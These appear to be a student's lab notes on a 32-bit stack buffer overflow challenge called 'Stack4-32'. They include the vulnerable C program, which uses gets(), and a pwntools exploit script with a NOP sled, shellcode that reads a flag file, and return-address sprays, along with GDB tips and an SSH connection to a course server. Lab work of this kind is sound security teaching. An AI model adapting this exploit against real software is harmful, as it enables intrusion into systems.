### GDB!!
- Permissions Denied Error: (-13) GDB runs as you, with your permissions
	- you do not have permissions to open the file
	- so the shellcode fails
	- WHy?: in GDB, you can arbitarily change memory addresses!
	- You can even use the shell in GDB.
- Addresses may be a little off
	- Bigger NOP sled

### Stack4-32
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv){
	char buffer[64];
	unsigned int ret;

	gets(buffer);

	ret = __builtin_return_address(0);

	if((ret & 0xff000000) != 0xff000000) {
		printf("32-bit matrix calibration failed... (%p)\n", ret);
		_exit(1);
	}
}
```


### exploit.py
```python
_from_ pwn _import_ *
_import_ os

elf = ELF('./stack4')
context.binary=elf
context.log_level = 'debug'
context.arch = 'i386'

debug_mode=False
cat = (_b_'\x90'*_0x_6000)+asm(shellcraft.cat("./flag.txt"))+asm(shellcraft.exit())
os.environ["BIGBOY"] = 'L'*60000
_#return addr local: 0xfffeeb9c_
_#start of buff local: 0xfffeeb4c_
_#ret_addr_1 local: 0xffff4b9c +0x4000_
_#ret_addr_2 local: 0xffffab9c +0x6000_

_#return addr server: 0xfffeeacc_
_#start of buff server: 0xfffeea7c_
_#ret_addr_1 server: 0xffff0acc_
_#ret_addr_2 server: 0xffff2acc_

offset = 80

#in 32 bit, ret pointer points to place where the loaction of the next point of execution is stored, which is why we need two guesses!!

_#sets the esp address to ret to_
ret_addr = _0x_ffff4b9c
guess_slide_1= p32(ret_addr)*_0x_1000

_#sets the addres for eip to jump to_
ret_addr_2 = _0x_ffffab9c
guess_slide_2 = p32(ret_addr_2)*_0x_1000

exploit_str = guess_slide_1 + guess_slide_2 + cat
dbg = cyclic(300)

if debug_mode == True:
    p = gdb.debug('./stack4', _gdbscript_ = '''
                    b *main
                    b *main+41
                    shell tmux select-layout main-vertical
                    shell tmux swap-pane -U
                    ''')

else:
    s = ssh('kcjesse', 'cs4401shell.walls.ninja', _keyfile_='./keys/kcjesse_ssh_key')
    s.set_working_directory('/problems/stack4r-32_3_2c7e74d57fc9c662ccad31d5572e0cf4/')
    p = s.process("./stack4", _env_={"BIGBOY":('L'*60000)})

p.sendline(exploit_str)

p.wait()
p.recvall()

```

### What does the `ret` instruction do?
- jumps back to the location where the next instruction is once the function is finished (the caller's next instruction)
- that address should be at the top of the stack or in `$ebp`
- so, move `$ebp` into `$eip`

### What is causing the corruption?
- `lea esp, [ecx-0x4]`
- record the offset of the `ret` and of `ecx`
- 
